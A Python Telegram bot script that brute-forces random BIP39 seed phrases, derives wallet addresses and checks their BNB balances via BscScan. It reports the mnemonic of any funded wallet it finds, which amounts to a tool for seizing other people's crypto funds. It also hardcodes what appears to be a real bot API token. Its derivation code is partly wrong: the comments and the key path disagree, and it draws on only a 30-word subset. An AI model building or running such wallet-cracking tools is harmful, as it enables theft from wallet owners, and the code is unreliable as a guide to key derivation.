import random
import requests
from mnemonic import Mnemonic
from bip32utils import BIP32Key
from eth_account import Account
from telegram import Update
from telegram.ext import Application, CommandHandler

# Initialize Telegram bot
TOKEN = '7951386517:AAGyo6QowaWl_M4oVk0DCPjzIeXMhZb5pDM'  # Replace with your bot's API token

# Initialize Mnemonic and Seed List
mnemo = Mnemonic("english")
seedlist = [
    "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", 
    "abuse", "access", "accident", "account", "accuse", "achieve", "acid", "acoustic", 
    "acquire", "across", "act", "action", "actor", "actress", "actual", "adapt", "add", 
    "addict", "address", "adjust", "admit"
]

# Counter to keep track of how many addresses have been checked
count = 0

# Function to generate a valid mnemonic
def generate_valid_mnemonic():
    while True:
        phrase = random.sample(seedlist, 12)
        phrase_str = ' '.join(phrase)
        if mnemo.check(phrase_str):
            return phrase_str

# Function to derive BNB address from the mnemonic
def mnemonic_to_address(mnemonic):
    seed = mnemo.to_seed(mnemonic)
    bip32_root_key = BIP32Key.fromEntropy(seed)
    bip32_child_key = bip32_root_key.ChildKey(44 + 0x80000000)  # BIP44 path for BNB (coin type 714)
    bip32_child_key = bip32_child_key.ChildKey(0)  # Account 0
    bip32_child_key = bip32_child_key.ChildKey(0)  # External chain (change 0)
    private_key = bip32_child_key.PrivateKey()
    
    account = Account.from_key(private_key)
    return account.address

# Function to check the BNB balance
def check_bnb_balance(address):
    url = f"https://api.bscscan.com/api?module=account&action=balance&address={address}&tag=latest"
    response = requests.get(url)
    data = response.json()
    
    if data["status"] == "1":
        balance = int(data["result"]) / 10**18  # Convert balance from Wei to BNB
        return balance
    else:
        return 0

# Function to find a BNB address with balance
async def find_bnb_with_balance(update: Update, context):
    global count
    message = await update.message.reply_text("Starting the search for BNB addresses with balance...")  # Initial message
    
    while True:
        mnemonic = generate_valid_mnemonic()
        address = mnemonic_to_address(mnemonic)
        balance = check_bnb_balance(address)
        count += 1
        
        if count % 100 == 0:  # Only update every 100 addresses checked
            # Construct the message
            msg = f"Checked {count} addresses\n"
            msg += f"☘️ Seed Phrase: {mnemonic}\n"
            msg += f"📬 Address: {address}\n"
            msg += f"💰 Balance: {balance} BNB\n"
            
            # Update the existing message
            await message.edit_text(msg)
        
        if balance > 0:
            found_message = f"Found balance!\nMnemonic: {mnemonic}\nAddress: {address}\nBalance: {balance} BNB\nChecked Addresses: {count}"
            await message.edit_text(found_message)  # Update the message with the found result
            break

# Start command to initiate the process
async def start(update: Update, context):
    await update.message.reply_text("Starting to search for BNB addresses with balance...")
    await find_bnb_with_balance(update, context)

# Set up the Application and dispatcher
def main():
    # Create an Application instance
    application = Application.builder().token(TOKEN).build()

    # Handler for the /start command
    application.add_handler(CommandHandler("start", start))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()